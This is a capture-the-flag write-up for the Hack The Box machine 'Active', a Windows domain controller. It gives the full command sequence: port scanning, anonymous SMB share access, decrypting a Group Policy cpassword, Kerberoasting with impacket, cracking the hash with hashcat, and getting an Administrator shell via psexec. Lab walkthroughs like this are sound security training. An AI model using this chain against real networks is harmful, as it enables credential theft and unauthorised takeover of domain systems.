---
title: "HTB Active"
permalink: /writeups/active
location: default
---

# HTB Active

**Machine Information**

	IP : 10.10.10.100
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.10.100 -- -sC -sV
```

This should reveal a number of services including `kerberos`, `ldap`, and `smb`.

```
PORT      STATE SERVICE       REASON  VERSION
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-07-03 06:41:56Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5722/tcp  open  msrpc         syn-ack Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack Microsoft Windows RPC
49171/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 49509/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38631/udp): CLEAN (Timeout)
|   Check 4 (port 2846/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2024-07-03T06:42:54
|_  start_date: 2024-07-03T06:39:28
|_clock-skew: 0s
```

### Getting a Foothold

**SMB**

Running `smbmap` shows that there is one share with read-only access as an anonymous user.

```
smbmap -H 10.10.10.100
```

After manually exploring the file system we find a `Groups.xml` file in the following location:

```
\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

Open the file to find a `cpassword` for the user `active.htb\SVC_TGS`.

This is an AES encrypted password but in 2014 Microsoft published the key on MSDN which allowed for all encrypted passwords to be decrypted. Unless these passwords were changed they are still vulnerable to decryption. Using `gpp-decrypt` we can get the plaintext password.

```
gpp-decrypt "PASSWORD HASH"
```

**Kerberoasting**

Using these credentials we can attempt to grab hashes using `impacket-GetUserSPNs`.

```
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS
```

**Hashcat**

We retrieved the hash for the Administrator user. We now attempt to crack it using `hashcat`.

```
hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt
```

This successfully cracks these hash revealing the password for the Administrator user. With Administrator credentials we can connect to the target system using `impacket-psexec`.

```
impacket-psexec active.htb/administrator@10.10.10.100
```

With shell access grab the user flag.

```
type C:\Users\SVC_TGS\Desktop\user.txt
```

### Privilege Escalation

No privilege escalation is required so we can grab the root flag as well.

```
type C:\Users\Administrator\Desktop\root.txt
```
